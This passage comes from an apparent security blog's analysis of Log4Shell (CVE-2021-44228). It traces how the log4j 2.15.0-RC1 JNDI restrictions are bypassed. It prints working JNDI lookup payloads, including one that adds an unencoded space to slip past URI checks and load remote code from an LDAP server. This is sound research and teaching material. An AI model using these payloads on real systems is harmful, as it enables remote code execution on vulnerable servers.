<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-core-its&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jcl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-taglib&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-samples&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-bom&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpa&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-couchdb&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb3&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-cassandra&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jakarta-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-perf&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-iostreams&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jul&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-liquibase&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-appserver&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-osgi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-docker&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>To compile, the maven command to run is as below</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the env variable JAVA_HOME to the path of jdk1.8</span></span><br><span class="line">./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=<span class="literal">true</span> <span class="comment"># skip tests to accelerate</span></span><br></pre></td></tr></table></figure>

<p>The generated artifacts (.jar) will be in the <code>target</code> directory of every module.</p>
<h3 id="Analysis-of-the-source-code-1"><a href="#Analysis-of-the-source-code-1" class="headerlink" title="Analysis of the source code"></a>Analysis of the source code</h3><p>Firstly, change the version of log4j to <code>2.15.0</code> in the <code>pom.xml</code>, replace the packages <code>.jar</code> with the generated before.</p>
<p>Because it disabled the lookups by default in <code>2.15.0</code>, we have to enable it with configuration.</p>
<p>Modify or create the <code>log4j2.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;lookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Now, the payload as below will be parsed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:java.version&#125;</span><br></pre></td></tr></table></figure>

<p>However, the payload for JNDI won’t be parsed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://ip:1389/#Exploit&#125;</span><br></pre></td></tr></table></figure>

<p>We know that the variable could be resolved but the JNDI has been restricted, let’s have a check with the process of variable resolving. Focus on <code>StrSubstitutor.resolveVariable()</code></p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203640824.png" alt="image-20220119203640824"></p>
<p>Step into the <code>lookup()</code></p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203737325.png" alt="image-20220119203737325"></p>
<p>We can find that the JNDI could be resolved as before, step into the <code>lookup()</code> again and check what is restricting the JNDI.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203859702.png" alt="image-20220119203859702"></p>
<p>Step into the <code>lookup()</code> of <code>jndiManager</code></p>
<p>We can find there are some restrictions about the protocol and source.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204000127.png" alt="image-20220119204000127"></p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204003833.png" alt="image-20220119204003833"></p>
<p>As we found, the source has been restricted to some local IP, let’s assume that the restrict about source won’t afffect us as we are testing locally. Apart from this, we can find that the LDAP protocol is permitted.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204438853.png" alt="image-20220119204438853"></p>
<p>We can find that the Reference Object have been forbidden by <code>attributeMap.get(OBJECT_FACTORY)!=null</code></p>
<p>Apart from this, the another way to exploit with JNDI, deserialization, has been restricted too, it limited the classes to some basic type with <code>allowedClasses</code> as below</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204722750.png" alt="image-20220119204722750"></p>
<p>Although it looks like perfect, but there is a vulnerability in the logic of exception handling </p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204943826.png" alt="image-20220119204943826"></p>
<p>If there is a URI with some error in syntax, it will skip all the assessment and execution will arrive the JNDI <code>lookup</code>.But, how to have a URI which have some error in syntax but could work as intended?</p>
<p>Just add a space that didn’t encoded by urlencode as below</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/# Exploit&#125;</span><br></pre></td></tr></table></figure>

<p>Run the trigger code again, we can find that the command in exploit code works.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119205538805.png" alt="image-20220119205538805"></p>
<h3 id="Summary-of-the-Bypassing"><a href="#Summary-of-the-Bypassing" class="headerlink" title="Summary of the Bypassing"></a>Summary of the Bypassing</h3><ul>
<li>The LookUps have to be enabled by developer</li>
<li>The source of LDAP have to be in the permit list, but the permit list only contains some local address by default</li>
</ul>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=w2F67LbEtnk&feature=youtu.be">Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube</a></li>
<li><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1786/">https://paper.seebug.org/1786/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262668">https://www.anquanke.com/post/id/262668</a></li>
<li><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649#toc-2">https://xz.aliyun.com/t/10649#toc-2</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201181">JNDI with LDAP </a></li>
<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html">Serializable Objects (oracle.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html">Referenceable Objects and References (oracle.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-1253127.html">https://www.icode9.com/content-4-1253127.html</a></li>
</ul>
</div><div class="article-licensing box"><div class="licensing-title"><p>Vulnerability Analysis - CVE-2021-44228 Log4Shell</p><p><a href="https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/">https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>4xpl0r3r</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-01-19</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-02-11</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CVE/">CVE</a><a class="link-muted mr-2" rel="tag" href="/tags/Java/">Java</a><a class="link-muted mr-2" rel="tag" href="/tags/JNDI/">JNDI</a><a class="link-muted mr-2" rel="tag" href="/tags/Format-String/">Format String</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">OSCE3 Review (OSCP+OSEP+OSWE+OSED)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/Docs/DIPD-Document/"><span class="level-item">DIPD Document</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "35e915dddd1788e6f474a4915ccfc943",
            repo: "Blog-Comments",
            owner: "4xpl0r3r",
            clientID: "9497fa90b0fed6513d24",
            clientSecret: "355dce85acb10c44d73d459e0087635c3d1404cb",
            admin: ["4xpl0r3r"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar1.png" alt="4xpl0r3r"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">4xpl0r3r</p><p class="is-size-6 is-block">OSCE3 | OSCP | CTFer</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Orange Cyberdefense, Shanghai</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">19</p></a></div></div></nav><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/4xpl0r3r"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:4xpl0r3r@gmail.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="https://api.follow.it/subscription-form/bGV4KzhoNzZNdk0rZ1Q0VDhvWlNucE5UYzFwZzVZZFJBaTdLRWxDRXVlenU2Q0k0SzFVUTA3OWtSSnNNa2NNaHdVNUtyVXFNVXBtUWpTT3VSVlE0ZysrWEdxMTFFQVFnV2tZUksrd0d3a1crVFgyaTBVbUhTRUplZVV3YnVNaDh8VjAxd1dmVEdzVzgvSTZMV3dXK1FHbGhFL2ZTdGl3b0FKeWk0YnZmQ2MyND0=/8" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Vulnerability-Profile"><span class="level-left"><span class="level-item">Vulnerability Profile</span></span></a></li><li><a class="level is-mobile" href="#The-Exploit"><span class="level-left"><span class="level-item">The Exploit</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#The-Exploit-Code"><span class="level-left"><span class="level-item">The Exploit Code</span></span></a></li><li><a class="level is-mobile" href="#Trigger-the-vulnerability"><span class="level-left"><span class="level-item">Trigger the vulnerability</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Analysis-of-the-Vulnerabilty"><span class="level-left"><span class="level-item">Analysis of the Vulnerabilty</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Analysis-of-the-source-code"><span class="level-left"><span class="level-item">Analysis of the source code</span></span></a></li><li><a class="level is-mobile" href="#Going-deeper"><span class="level-left"><span class="level-item">Going deeper</span></span></a></li><li><a class="level is-mobile" href="#Mitigation-Disable-Lookups-with-System-configuration"><span class="level-left"><span class="level-item">Mitigation - Disable Lookups with System configuration</span></span></a></li><li><a class="level is-mobile" href="#Mitigation-Disable-Lookups-with-Log4j-Configuration"><span class="level-left"><span class="level-item">Mitigation - Disable Lookups with Log4j Configuration</span></span></a></li><li><a class="level is-mobile" href="#Thinking-Why-the-Log4j2-needs-the-capability-of-JNDI"><span class="level-left"><span class="level-item">Thinking - Why the Log4j2 needs the capability of JNDI</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Something-else"><span class="level-left"><span class="level-item">Something else</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#The-common-false-positive"><span class="level-left"><span class="level-item">The common false positive</span></span></a></li><li><a class="level is-mobile" href="#How-to-defense"><span class="level-left"><span class="level-item">How to defense</span></span></a></li><li><a class="level is-mobile" href="#The-official-fixing"><span class="level-left"><span class="level-item">The official fixing</span></span></a></li></ul></li><li><a class="level is-mobile" href="#The-Bypassing-in-log4j-2-15-0-RC1"><span class="level-left"><span class="level-item">The Bypassing in log4j 2.15.0-RC1</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Compiling"><span class="level-left"><span class="level-item">Compiling</span></span></a></li><li><a class="level is-mobile" href="#Analysis-of-the-source-code-1"><span class="level-left"><span class="level-item">Analysis of the source code</span></span></a></li><li><a class="level is-mobile" href="#Summary-of-the-Bypassing"><span class="level-left"><span class="level-item">Summary of the Bypassing</span></span></a></li></ul></li><li><a class="level is-mobile" href="#References"><span class="level-left"><span class="level-item">References</span></span></a></li></ul></div></div><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://cn.4xpl0r3r.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Switch Language - 简体中文</span></span><span class="level-right"><span class="level-item tag">cn.4xpl0r3r.com</span></span></a></li><li><a class="level is-mobile" href="https://github.com/4xpl0r3r" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">GitHub</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Certifications/"><span class="level-start"><span class="level-item">Certifications</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Docs/"><span class="level-start"><span class="level-item">Docs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Experience/"><span class="level-start"><span class="level-item">Experience</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Red-Blue/"><span class="level-start"><span class="level-item">Red&amp;Blue</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Vuln-Analysis/"><span class="level-start"><span class="level-item">Vuln-Analysis</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-13T08:45:43.000Z">2023-03-13</time></p><p class="title"><a href="/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/">C2 Payload Hiding and Memory Forensics</a></p><p class="categories"><a href="/categories/Red-Blue/">Red&amp;Blue</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-14T06:24:24.000Z">2023-02-14</time></p><p class="title"><a href="/Experience/Using-CodeQL-to-find-out-Log4j-CVE-2021-44228/">Using CodeQL to find out Log4j CVE-2021-44228</a></p><p class="categories"><a href="/categories/Experience/">Experience</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-30T03:46:14.000Z">2022-01-30</time></p><p class="title"><a href="/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/">Vulnerability-Analysis - CVE-2021-4034 Linux Polkit Privilege Escalation</a></p><p class="categories"><a href="/categories/Vuln-Analysis/">Vuln-Analysis</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-27T14:39:50.000Z">2022-01-27</time></p><p class="title"><a href="/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/">OSCE3 Review (OSCP+OSEP+OSWE+OSED)</a></p><p class="categories"><a href="/categories/Certifications/">Certifications</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-19T13:06:00.000Z">2022-01-19</time></p><p class="title"><a href="/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/">Vulnerability Analysis - CVE-2021-44228 Log4Shell</a></p><p class="categories"><a href="/categories/Vuln-Analysis/">Vuln-Analysis</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">March 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">February 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Antivirus-Evasion/"><span class="tag">Antivirus Evasion</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Blue-Teaming/"><span class="tag">Blue Teaming</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C/"><span class="tag">C#</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C-C/"><span class="tag">C&amp;C++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C2/"><span class="tag">C2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CodeQL/"><span class="tag">CodeQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Environment/"><span class="tag">Environment</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Format-String/"><span class="tag">Format String</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JNDI/"><span class="tag">JNDI</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Memory-Forensics/"><span class="tag">Memory Forensics</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/OffSec/"><span class="tag">OffSec</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PWN/"><span class="tag">PWN</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PowerShell/"><span class="tag">PowerShell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Priv-Escalation/"><span class="tag">Priv-Escalation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Red-Teaming/"><span class="tag">Red Teaming</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">4xpl0r3r</a><p class="is-size-7"><span>&copy; 2023 4xpl0r3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>